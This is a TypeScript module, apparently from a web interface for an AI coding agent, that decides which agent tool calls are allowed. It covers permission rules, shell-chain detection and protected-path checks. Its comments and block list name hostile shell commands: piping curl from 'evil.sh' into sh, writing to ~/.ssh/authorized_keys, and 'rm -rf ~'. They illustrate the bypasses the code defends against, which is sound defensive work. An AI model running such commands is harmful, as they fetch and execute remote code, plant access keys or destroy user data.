import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { randomUUID } from "node:crypto";

// Claude Code-style permission rules, per project: "Write", "Edit",
// "Bash(bun test:*)" — a bare tool name allows the tool, a parenthesized
// specifier allows matching inputs only (":*" = prefix at a token/segment
// boundary, otherwise exact).
// `reason` distinguishes an affirmative user deny from a timeout/abort so
// callers don't misreport a non-answer as a refusal.
export type PermissionDecision = {
  behavior: "allow" | "deny";
  always?: boolean;
  reason?: "timeout" | "aborted" | "coalesced";
  // The specific rule to persist when `always` is set — one of the options
  // ruleOptionsFor offered for this tool call, validated by the route
  // (isOfferedRule) before it ever reaches here. Absent means "use the
  // caller's own default" — route.ts's canUseTool falls back to the prefix
  // rule (ruleFor's output) it minted the pending request with.
  rule?: string;
};

type PendingRequest = {
  project: string;
  rule: string;
  toolName: string;
  input: Record<string, unknown>;
  // The rule-choice options offered for this tool call (ruleOptionsFor's
  // output), remembered so POST /api/chat/permission can validate a
  // client-chosen `rule` against what was actually offered — never a wider,
  // client-injected string. Defaults to [] for callers (tests) that don't
  // pass any.
  ruleOptions: Array<{ rule: string; label: string }>;
  resolve: (d: PermissionDecision) => void;
  timer: ReturnType<typeof setTimeout>;
};

// globalThis so pendings survive Next dev HMR module reloads.
const g = globalThis as unknown as { __telarPending?: Map<string, PendingRequest> };
const pending = (g.__telarPending ??= new Map());

// Lazy so a test (or a reconfigured process) can point TELAR_HOME elsewhere.
const telarHome = () => process.env.TELAR_HOME ?? path.join(os.homedir(), ".telar");
const rulesFile = () => path.join(telarHome(), "permissions.json");

function atomicWrite(file: string, data: string) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  const tmp = file + ".tmp";
  fs.writeFileSync(tmp, data);
  fs.renameSync(tmp, file);
}

function readAll(): Record<string, { allow: string[] }> {
  try {
    return JSON.parse(fs.readFileSync(rulesFile(), "utf8"));
  } catch {
    return {};
  }
}

export function readRules(project: string): string[] {
  return readAll()[project]?.allow ?? [];
}

export function addRule(project: string, rule: string): void {
  const all = readAll();
  const entry = (all[project] ??= { allow: [] });
  if (entry.allow.includes(rule)) return;
  entry.allow.push(rule);
  atomicWrite(rulesFile(), JSON.stringify(all, null, 2));
}

export function removeRule(project: string, rule: string): void {
  const all = readAll();
  const entry = all[project];
  if (!entry) return;
  entry.allow = entry.allow.filter((r) => r !== rule);
  atomicWrite(rulesFile(), JSON.stringify(all, null, 2));
}

// Leading "VAR=value" environment assignments (PORT=3100 bun run dev) don't
// name the command — skip them when picking what to group the rule by.
const ENV_ASSIGN = /^[A-Za-z_][A-Za-z0-9_]*=/;

// Command names for which a bare "Bash(<name>:*)" rule — i.e. "always allow
// any invocation of this command, with any args" — is never offered as a
// choice. These either grant broad system access on their own (sudo, sh,
// bash, zsh, eval, exec), are general-purpose command-execution wrappers
// that make "any args" equivalent to a bare shell (env, xargs, find (via
// -exec), timeout, nohup, nice, setsid, watch — all can invoke an arbitrary
// OTHER program with attacker-controlled args and no shell metacharacter, so
// SHELL_CHAIN never catches them), are commonly used to route around
// narrower rules (curl, wget, npx, bunx, node, python*, perl, ruby, php,
// lua, deno, which can run arbitrary fetched or interpreted code), or are
// destructive enough that "any args" is too wide (rm, rmdir, dd, mkfs,
// chmod, chown, kill, pkill).
export const DANGEROUS_COMMANDS: readonly string[] = [
  "rm",
  "rmdir",
  "sudo",
  "sh",
  "bash",
  "zsh",
  "eval",
  "exec",
  "env",
  "xargs",
  "find",
  "timeout",
  "nohup",
  "nice",
  "setsid",
  "watch",
  "dd",
  "mkfs",
  "chmod",
  "chown",
  "curl",
  "wget",
  "kill",
  "pkill",
  "npx",
  "bunx",
  "node",
  "python",
  "python3",
  "perl",
  "ruby",
  "php",
  "lua",
  "deno",
];

// The specifier for a rule derived from a tool call: for Bash, the command
// name plus its second raw token (if any); the bare tool name for everything
// else. The second token is folded in unconditionally — NOT only when it
// looks like a subcommand word (letters/dashes). Gating on that ("git log"
// folds, "-rf" or "/path" doesn't) sounds like it only affects generalization,
// but it means any command invoked with a flag, path, or quoted argument as
// its second token — i.e. almost every real invocation — collapses to a bare
// "Bash(<cmd>:*)" rule with NO argument constraint at all: approving a single
// scoped `rm -rf ./node_modules/.cache` would silently persist a rule that
// also matches `rm -rf ~`. Folding the raw second token always, like the
// pre-existing on-disk rule format, keeps the rule scoped to what was
// actually approved; it's narrower and "always allow" won't stick across
// differently-argued invocations, but that's the correct tradeoff.
export function ruleFor(toolName: string, input: Record<string, unknown>): string {
  if (toolName === "Bash" && typeof input.command === "string") {
    const tokens = input.command.trim().split(/\s+/).filter(Boolean);
    let i = 0;
    while (i < tokens.length && ENV_ASSIGN.test(tokens[i])) i++;
    const rest = tokens.slice(i);
    if (rest.length === 0) {
      // Empty command, or nothing but env assignments — there's no command
      // name to group by. A bare "Bash" rule would allow ANY command, so
      // fall back to the old exact-two-token grouping instead: narrow, but
      // safe.
      const head = tokens.slice(0, 2).join(" ");
      return `Bash(${head}:*)`;
    }
    const [name, second] = rest;
    const head = second ? `${name} ${second}` : name;
    return `Bash(${head}:*)`;
  }
  return toolName;
}

// Parse "Tool" | "Tool(spec)" without a strict char class so MCP tool names
// (mcp__x__y) and specs containing "(" survive.
function parseRule(rule: string): { tool: string; spec: string | null } | null {
  const open = rule.indexOf("(");
  if (open === -1) return rule ? { tool: rule, spec: null } : null;
  if (!rule.endsWith(")")) return null;
  return { tool: rule.slice(0, open), spec: rule.slice(open + 1, -1) };
}

// The choices offered to the user for "always allow" on a given tool call,
// ordered narrow -> broad. For Bash: the exact command typed, the ruleFor
// prefix (command + second raw token), and — unless the command name is in
// DANGEROUS_COMMANDS — a command-wide rule with no argument constraint at
// all. Non-Bash tools get a single bare-tool-name option; there's nothing
// narrower to offer since ruleFor/ruleMatches don't inspect non-Bash inputs.
export function ruleOptionsFor(
  toolName: string,
  input: Record<string, unknown>,
): Array<{ rule: string; label: string }> {
  if (toolName !== "Bash" || typeof input.command !== "string") {
    return [{ rule: toolName, label: `any '${toolName}' use` }];
  }
  const command = input.command;
  const options: Array<{ rule: string; label: string }> = [];

  // Exact spec is the raw (untrimmed) command, so it matches byte-for-byte
  // on re-invocation — ruleMatches compares the exact spec against the raw
  // input.command, not a trimmed copy.
  if (command.trim()) {
    options.push({ rule: `Bash(${command})`, label: "this exact command" });
  }

  const prefixRule = ruleFor(toolName, input);
  const parsedPrefix = parseRule(prefixRule);
  const head = parsedPrefix?.spec?.endsWith(":*") ? parsedPrefix.spec.slice(0, -2) : "";
  options.push({
    rule: prefixRule,
    label: head ? `any '${head}' command` : "any command",
  });

  const tokens = command.trim().split(/\s+/).filter(Boolean);
  let i = 0;
  while (i < tokens.length && ENV_ASSIGN.test(tokens[i])) i++;
  const name = tokens[i];
  if (name && !DANGEROUS_COMMANDS.includes(name)) {
    const wideRule = `Bash(${name}:*)`;
    // Single-word commands (no second token) already collapse to this same
    // rule via ruleFor — don't offer the identical choice twice.
    if (wideRule !== prefixRule) {
      options.push({ rule: wideRule, label: `any '${name}' command` });
    }
  }

  return options;
}

// Strict membership check the route uses to reject a client-injected rule
// that isn't one of the choices actually offered for this tool call — exact
// string equality only, no prefix/pattern matching.
export function isOfferedRule(options: Array<{ rule: string; label: string }>, rule: string): boolean {
  return options.some((o) => o.rule === rule);
}

// The only SDK permission modes a client may ever select. The SDK's own
// PermissionMode also includes "bypassPermissions" (skips canUseTool
// entirely, requires an extra opt-in flag) and "dontAsk"/"plan" (not
// meaningful choices from this UI) — none of those are ever accepted from a
// client request even if sent; see isValidPermissionMode and its use in the
// chat route's 400 check.
export const PERMISSION_MODES = ["default", "auto", "acceptEdits"] as const;
export type ClientPermissionMode = (typeof PERMISSION_MODES)[number];

export function isValidPermissionMode(mode: unknown): mode is ClientPermissionMode {
  return typeof mode === "string" && (PERMISSION_MODES as readonly string[]).includes(mode);
}

// Shell separators/substitution/redirection that chain or divert a second
// command/target onto the first: ; & | ` newline, $( ), and < > (which also
// covers << heredocs and <( )/>( ) process substitution). A prefix rule like
// "bun test:*" must never match across one of these — otherwise "bun test &&
// curl evil.sh | sh" would be silently authorized by an "always allow" the
// user gave for "bun test". Redirection is included because a per-command
// rule like "Bash(cat:*)" would otherwise let `cat file > ~/.ssh/authorized_keys`
// through unprompted — no chain keyword needed, just an output target.
const SHELL_CHAIN = /[;&|`\n<>]|\$\(/;

// Mirror ruleFor's naming skip on the match side: drop leading VAR=value
// tokens so a rule minted from "PORT=3100 bun run dev" (named "bun run",
// per ruleFor) matches env-prefixed invocations, including its own creator.
// If EVERY token is an env assignment there's no command to skip to —
// ruleFor's degenerate fallback keeps the raw tokens in that case (see its
// "nothing but env assignments" branch), so mirror that here too instead of
// stripping down to an empty list.
function stripLeadingEnvAssignments(tokens: string[]): string[] {
  let i = 0;
  while (i < tokens.length && ENV_ASSIGN.test(tokens[i])) i++;
  return i < tokens.length ? tokens.slice(i) : tokens;
}

// Prefix match at a token boundary: "bun test" matches "bun test x" but not
// "bun tester", and never matches a command that chains on a second command
// via a shell separator (see SHELL_CHAIN). Tokenizing also absorbs
// incidental extra whitespace.
function tokenPrefix(prefix: string, target: string): boolean {
  if (SHELL_CHAIN.test(target)) return false;
  const p = prefix.trim().split(/\s+/).filter(Boolean);
  const t = stripLeadingEnvAssignments(target.trim().split(/\s+/).filter(Boolean));
  if (!p.length || t.length < p.length) return false;
  return p.every((tok, i) => t[i] === tok);
}

// Prefix match at a path-segment boundary: "src" matches "src/a.ts" but not
// "srcx". Segments are compared after normalization so "./" and trailing
// slashes don't matter.
function pathPrefix(prefix: string, target: string): boolean {
  const norm = (s: string) => s.replace(/\/+$/, "").split("/").filter((seg) => seg && seg !== ".");
  const p = norm(prefix);
  const t = norm(target);
  if (!p.length || t.length < p.length) return false;
  return p.every((seg, i) => t[i] === seg);
}

export function ruleMatches(rule: string, toolName: string, input: Record<string, unknown>): boolean {
  const parsed = parseRule(rule);
  if (!parsed || parsed.tool !== toolName) return false;
  if (parsed.spec === null) return true; // bare tool name → allow the tool
  const isCommand = typeof input.command === "string";
  const target = isCommand
    ? (input.command as string)
    : inputPaths(input)[0] ?? "";
  if (parsed.spec.endsWith(":*")) {
    const prefix = parsed.spec.slice(0, -2);
    if (!prefix) return false;
    return isCommand ? tokenPrefix(prefix, target) : pathPrefix(prefix, target);
  }
  return target === parsed.spec;
}

// Tool inputs that name a file, in priority order — Write/Edit/MultiEdit use
// file_path, NotebookEdit uses notebook_path.
const PATH_KEYS = ["file_path", "notebook_path", "path"];
export function inputPaths(input: Record<string, unknown>): string[] {
  return PATH_KEYS.map((k) => input[k]).filter(
    (v): v is string => typeof v === "string" && v.length > 0,
  );
}

// Resolve symlinks as far up the tree as they exist. A tool's target may not
// exist yet (e.g. Write creating a new file), so this walks up to the first
// existing ancestor, realpath's that, then rejoins the remaining segments —
// a symlinked ancestor directory still gets caught even for a new file.
function realpathOrSelf(p: string): string {
  try {
    return fs.realpathSync(p);
  } catch {
    const parent = path.dirname(p);
    if (parent === p) return p;
    // Not a real dynamic-import/require path — a bounded upward walk over an
    // already-resolved absolute path. Silences Turbopack's whole-project
    // filesystem-tracing warning, which doesn't apply here.
    return path.join(/*turbopackIgnore: true*/ realpathOrSelf(parent), path.basename(p));
  }
}

// True when `target` (a tool's file path, absolute or relative to `root`)
// resolves to, or lands inside, one of the project's protected paths. Both
// sides are resolved against `root` and then through realpath, so ../
// traversal, trailing slashes, absolute-vs-relative mismatches, and a
// symlink planted inside the repo that points at a protected file all
// reduce to a canonical comparison.
// NOTE: this only guards writes (called from the Write/Edit/etc branch of
// canUseTool). Read/Grep/Glob are pre-allowed and never path-checked, so a
// protected file's *contents* can still be read and later exfiltrated via an
// approved Bash command — protectedPaths stops modification, not disclosure.
export function isProtectedPath(root: string, protectedPaths: string[], target: string): boolean {
  if (!target) return false;
  const abs = realpathOrSelf(path.resolve(root, target));
  return protectedPaths.some((p) => {
    if (!p) return false;
    const base = realpathOrSelf(path.resolve(root, p));
    return abs === base || abs.startsWith(base + path.sep);
  });
}

// Bash carries its target in `command`, not in a path field, so
// isProtectedPath(inputPaths(...)) never sees it — protectedPaths would
// otherwise be silently bypassed by e.g. Bash(rm -rf .env). This is a
// best-effort static check: split the command on whitespace/shell
// metacharacters and test every resulting word as a candidate path. It
// cannot see through variable expansion or obfuscation, but it catches the
// direct case, which is what "always allow bun test" style rules would
// otherwise let through unchecked.
const BASH_WORD_SPLIT = /[\s;&|><$`"'(){}]+/;
export function bashTouchesProtectedPath(root: string, protectedPaths: string[], command: string): boolean {
  if (!protectedPaths.length) return false;
  return command
    .split(BASH_WORD_SPLIT)
    .filter(Boolean)
    .some((word) => isProtectedPath(root, protectedPaths, word));
}

// Pure extraction of the hard-deny guardrail checks (disallowedTools,
// protectedPaths over path-shaped inputs, protectedPaths over a Bash
// command's words) that used to be inlined in the chat route's canUseTool.
// Callable from both canUseTool and, later, an SDK PreToolUse hook — neither
// of which this function knows about. Order matters: disallowedTools first
// (cheapest, no filesystem access), then the two protectedPaths checks.
export function makeGuardrailDecision(
  manifest: { guardrails: { disallowedTools: string[]; protectedPaths: string[] } },
  root: string,
  toolName: string,
  input: Record<string, unknown>,
): { behavior: "allow" } | { behavior: "deny"; message: string } {
  const g = manifest.guardrails;
  if (g.disallowedTools.includes(toolName)) {
    return { behavior: "deny", message: `${toolName} is disallowed by this project's guardrails.` };
  }
  const blocked = inputPaths(input).find((t) => isProtectedPath(root, g.protectedPaths, t));
  if (blocked) {
    return { behavior: "deny", message: `"${blocked}" is a protected path in this project.` };
  }
  // protectedPaths above only inspects path-shaped input keys, which Bash
  // never populates (its target lives in `command`) — check it separately
  // or the guardrail is a no-op for the most powerful tool.
  if (
    toolName === "Bash" &&
    typeof input.command === "string" &&
    bashTouchesProtectedPath(root, g.protectedPaths, input.command)
  ) {
    return { behavior: "deny", message: "This command touches a protected path in this project." };
  }
  return { behavior: "allow" };
}

export function createPending(
  project: string,
  toolName: string,
  input: Record<string, unknown>,
  rule: string,
  timeoutMs = 120_000,
  ruleOptions: Array<{ rule: string; label: string }> = [],
): { id: string; promise: Promise<PermissionDecision> } {
  let id = "perm_" + randomUUID();
  while (pending.has(id)) id = "perm_" + randomUUID(); // paranoia: randomUUID collisions are not realistic
  const promise = new Promise<PermissionDecision>((resolve) => {
    const timer = setTimeout(() => {
      pending.delete(id);
      resolve({ behavior: "deny", reason: "timeout" });
    }, timeoutMs);
    pending.set(id, { project, rule, toolName, input, ruleOptions, resolve, timer });
  });
  return { id, promise };
}

// Looked up by POST /api/chat/permission to validate a client-supplied
// `rule` against what was actually offered for this still-open request.
// undefined for an unknown or already-resolved id — the route treats that
// as "reject any rule" rather than trusting an unvalidatable choice.
export function pendingRuleOptions(id: string): Array<{ rule: string; label: string }> | undefined {
  return pending.get(id)?.ruleOptions;
}

export function resolvePending(id: string, decision: PermissionDecision): boolean {
  const p = pending.get(id);
  if (!p) return false;
  clearTimeout(p.timer);
  pending.delete(id);
  p.resolve(decision);
  // "Always allow" persists a rule that covers every other tool call already
  // waiting on the same project — resolve those too instead of making them
  // sit out the prompt (or the 120s timeout) for a rule the user just
  // approved. The rule itself is persisted by the caller of resolvePending
  // (route.ts, keyed off `decision.always`), not here.
  //
  // Critical: this must check the rule the user ACTUALLY picked
  // (decision.rule, falling back to this request's own default only when
  // they didn't pick a narrower one) against each sibling's OWN toolName/
  // input via ruleMatches — never just compare the two requests' stored
  // *default* `rule` labels for equality. That default is only a grouping
  // key (same command name + second token) computed once at createPending
  // time; it says nothing about what the user actually approved, and
  // skipping ruleMatches would also skip its SHELL_CHAIN check, so a
  // concurrently-pending sibling with a shell-chained/injected payload that
  // merely shares the same command-name grouping would get silently
  // auto-approved regardless of how narrow a rule the user chose.
  if (decision.behavior === "allow" && decision.always) {
    const persistedRule = decision.rule ?? p.rule;
    for (const [otherId, other] of pending) {
      if (other.project === p.project && ruleMatches(persistedRule, other.toolName, other.input)) {
        clearTimeout(other.timer);
        pending.delete(otherId);
        other.resolve({ behavior: "allow", reason: "coalesced" });
      }
    }
  }
  return true;
}
